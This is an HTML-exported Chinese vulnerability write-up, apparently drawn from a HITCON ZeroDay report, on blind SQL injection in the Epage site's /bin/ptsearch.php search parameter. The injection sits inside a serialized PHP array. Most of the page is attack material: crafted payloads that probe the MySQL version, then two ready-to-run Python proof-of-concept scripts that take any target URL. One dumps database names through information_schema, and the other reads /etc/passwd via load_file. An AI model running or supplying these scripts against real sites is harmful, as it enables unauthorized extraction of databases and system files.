<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="epage-sql-注入漏洞"><span class="csDE05BCC">Epage sql </span><span class="csECDA2D3">注入漏洞</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">将单引号用来站内搜寻时发现不可注入，正准备放弃时发现搜索结果的第</span><span class="cs8926E06">N</span><span class="cs9C1B1871">页的连结中使用了</span><span class="cs8926E06">php</span><span class="cs9C1B1871">序列</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">刚好最近学到</span><span class="cs8926E06">php</span><span class="cs9C1B1871">序列不安全，未检查的情况下</span><span class="cs8926E06">unserialize</span><span class="cs9C1B1871">后会造成许多问题，甚至</span><span class="cs8926E06">RCE<br/></span><span class="cs9C1B1871">看了一下序列的长相是否有机可称：</span></p><p class="cs3A447A38"><span class="cs9FB05234">wc=a:3:{s:3:&quot;Key&quot;;s:4:&quot;test&quot;;s:8:&quot;pagesize&quot;;s:2:&quot;10&quot;;s:3:&quot;Rcg&quot;;i:0;}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">嗯，是一个序列化过的</span><span class="cs8926E06">array</span><span class="cs9C1B1871">，里面的</span><span class="cs8926E06">key</span><span class="cs9C1B1871">竟然是我刚才的输入！？</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">试试注入单引号，失败，准备放弃</span><span class="cs8926E06">QQ<br/></span><span class="cs9C1B1871">我的输入会显示出来</span><span class="cs8926E06">......</span><span class="cs9C1B1871">，那试试</span><span class="cs8926E06">XSS</span><span class="cs9C1B1871">好了</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">蛤，报错！？原来没有过滤双引号啊</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">而且还回显了完整的</span><span class="cs8926E06">sql</span><span class="cs9C1B1871">语句</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">开始闭合语句</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">透过构造</span></p><p class="cs3A447A38"><span class="cs9FB05234">a:3:{s:3:&quot;Key&quot;;s:42:&quot;&quot;and(substring(version(),1,1)=&quot;5&quot;)and&quot;%&quot;=&quot;&quot;;s:8:&quot;pagesize&quot;;s:2:&quot;10&quot;;s:3:&quot;Rcg&quot;;i:0;}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">查无资料</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">透过构造</span></p><p class="cs3A447A38"><span class="cs9FB05234">a:3:{s:3:&quot;Key&quot;;s:42:&quot;&quot;and(substring(version(),1,1)=&quot;5&quot;)and&quot;%&quot;=&quot;&quot;;s:8:&quot;pagesize&quot;;s:2:&quot;10&quot;;s:3:&quot;Rcg&quot;;i:0;}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">显示查询，以此类推</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">透过构造</span></p><p class="cs3A447A38"><span class="cs9FB05234">a:3:{s:3:&quot;Key&quot;;s:42:&quot;&quot;and(substring(version(),3,1)=&quot;0&quot;)and&quot;%&quot;=&quot;&quot;;s:8:&quot;pagesize&quot;;s:2:&quot;10&quot;;s:3:&quot;Rcg&quot;;i:0;}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">显示查询</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">透过构造</span></p><p class="cs3A447A38"><span class="cs9FB05234">a:3:{s:3:&quot;Key&quot;;s:42:&quot;&quot;and(substring(version(),5,1)=&quot;8&quot;)and&quot;%&quot;=&quot;&quot;;s:8:&quot;pagesize&quot;;s:2:&quot;10&quot;;s:3:&quot;Rcg&quot;;i:0;}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">显示查询</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">证明存在</span><span class="cs8926E06">Boolean Based Blind Injection</span><span class="cs9C1B1871">漏洞，</span><span class="cs8926E06">mysql</span><span class="cs9C1B1871">版本为</span><span class="cs8926E06">5.0.8</span></p><h3 class="cs868C439D">
			<a name="poc1-retrive-database"><span class="csD1E291E2">poc1 retrive database</span></a></h3>
		<p class="cs6FD73CFB"><span class="cs9C1B1871">可通过</span><span class="cs8926E06">poc</span><span class="cs9C1B1871">解析</span><span class="cs8926E06">server</span><span class="cs9C1B1871">上的</span><span class="cs8926E06">database</span><span class="cs9C1B1871">名称与版本</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">同理也可以进一步</span><span class="cs8926E06">dump</span><span class="cs9C1B1871">出每个栏位的资料</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">此外网站也有权限可以</span><span class="cs8926E06">load_file</span><span class="cs9C1B1871">（</span><span class="cs8926E06">outfile</span><span class="cs9C1B1871">试不出来，可能是没权限或我太菜了</span><span class="cs8926E06">QQ</span><span class="cs9C1B1871">）</span></p><p class="cs3A447A38"><span class="cs9FB05234">import requests</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import time</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">print(&quot;Blind SQL injection in php Serialize POC&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">url=input(&quot;Target url:&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">url += &quot;/bin/ptsearch.php?wc=a:3:{s:3:\&quot;Key\&quot;;s:@:\&quot;*\&quot;;s:8:\&quot;pagesize\&quot;;s:2:\&quot;10\&quot;;s:3:\&quot;Rcg\&quot;;i:0;}&quot;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">print(&quot;start parsing&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">print(&quot;&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">print(&quot;MYSQL version:&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">for i in range(1,10,2):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">for k in range(0,10):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">session = requests.Session()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">closed_sql=&#39;\&quot;and({inject})and\&quot;%\&quot;=\&quot;&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">inject_sql= closed_sql.format(inject=&quot;substring(version(),{i},1)=\&quot;{k}\&quot;&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">inject_sql= inject_sql.format(i=i,k=k)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">inject_url=url.replace(&quot;@&quot;,str(len(inject_sql)))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">inject_url=inject_url.replace(&quot;*&quot;,inject_sql)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">r = session.get(inject_url)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">r.encoding = &#39;utf-8&#39;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if(&quot;</span><span class="cs7FFD2630">未找到符合條件的資料</span><span class="cs9FB05234">&quot; not in r.text):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(k,end=&quot;.&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">print(&quot;version detect complete,take a break...........&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">print()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">print()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">time.sleep(5)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">print(&quot;parsing lenth of available database..............&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">all_valid_database=0</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">for i in range(1,50):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">session = requests.Session()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">closed_sql=&#39;\&quot;and({inject})and\&quot;%\&quot;=\&quot;&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">inject_sql= closed_sql.format(inject=&quot;(ascii(substring((select(group_concat(schema_name))from(information_schema.schemata)),{i},1)))&gt;0&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">inject_sql= inject_sql.format(i=i)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">inject_url=url.replace(&quot;@&quot;,str(len(inject_sql)))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">inject_url=inject_url.replace(&quot;*&quot;,inject_sql)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">r = session.get(inject_url)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">r.encoding = &#39;utf-8&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">if(&quot;</span><span class="cs7FFD2630">未找到符合條件的資料</span><span class="cs9FB05234">&quot; in r.text):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">all_valid_database = i</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">print(all_valid_database)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">break</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">print(&quot;parsing finish,take a break&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">time.sleep(3)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">print(&quot;start parsing available database&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">print(&quot;available database:&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">for i in range(1,all_valid_database):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">time.sleep(2)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">for k in range(32,126):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">session = requests.Session()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">closed_sql=&#39;\&quot;and({inject})and\&quot;%\&quot;=\&quot;&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">inject_sql= closed_sql.format(inject=&quot;(ascii(substring((select(group_concat(schema_name))from(information_schema.schemata)),{i},1)))&gt;{k}&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">inject_sql= inject_sql.format(i=i,k=k)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">inject_url=url.replace(&quot;@&quot;,str(len(inject_sql)))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">inject_url=inject_url.replace(&quot;*&quot;,inject_sql)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">r = session.get(inject_url)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">r.encoding = &#39;utf-8&#39;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if(&quot;</span><span class="cs7FFD2630">未找到符合條件的資料</span><span class="cs9FB05234">&quot; in r.text):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (k==44):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(chr(k),end=&quot;&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(chr(k),end=&quot;&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break</span></p><h3 class="cs868C439D">
			<a name="poc2-load-etcpasswd"><span class="csD1E291E2">poc2 load etc/passwd</span></a></h3>
		<p class="cs3A447A38"><span class="cs9FB05234">import requests</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import time</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">print(&quot;Blind SQL injection in php Serialize POC&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">url=input(&quot;Target url:&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">url += &quot;/bin/ptsearch.php?wc=a:3:{s:3:\&quot;Key\&quot;;s:@:\&quot;*\&quot;;s:8:\&quot;pagesize\&quot;;s:2:\&quot;10\&quot;;s:3:\&quot;Rcg\&quot;;i:0;}&quot;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">print(&quot;start parsing&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">print(&quot;&quot;)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">all_valid_database=1436#</span><span class="cs7FFD2630">如上一個</span><span class="cs9FB05234">poc</span><span class="cs7FFD2630">的找法，但這次手動二分搜尋法</span><span class="cs9FB05234">xd</span><span class="cs7FFD2630">，怕用程式跑，太密集會被</span><span class="cs9FB05234">server</span><span class="cs7FFD2630">擋掉</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">print(&quot;start parsing available file&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">print(&quot;etc/passwd:&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">for i in range(1,all_valid_database):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">time.sleep(2)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">for k in range(32,126):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">session = requests.Session()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">closed_sql=&#39;\&quot;and({inject})and\&quot;%\&quot;=\&quot;&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">inject_sql= closed_sql.format(inject=&quot;(ascii(substring((select(load_file(\&quot;/etc/passwd\&quot;))),{i},1)))&gt;{k}&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">inject_sql= inject_sql.format(i=i,k=k)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">inject_url=url.replace(&quot;@&quot;,str(len(inject_sql)))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">inject_url=inject_url.replace(&quot;*&quot;,inject_sql)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">r = session.get(inject_url)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">r.encoding = &#39;utf-8&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">if(&quot;</span><span class="cs7FFD2630">未找到符合條件的資料</span><span class="cs9FB05234">&quot; in r.text):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">print(chr(k),end=&quot;&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">break</span></p><p class="cs40DD2BC9"><span class="cs8926E06">1.png</span></p><p class="cs40DD2BC9"><span class="cs8926E06">2.png</span></p><p class="cs40DD2BC9"><span class="cs8926E06">3.png</span></p><h2 class="cs868C439D">
			<a name="参考链接"><span class="cs83F14626">参考链接</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs8926E06">https://zeroday.hitcon.org/vulnerability/ZD-2020-00601</span></p></body>
</html>
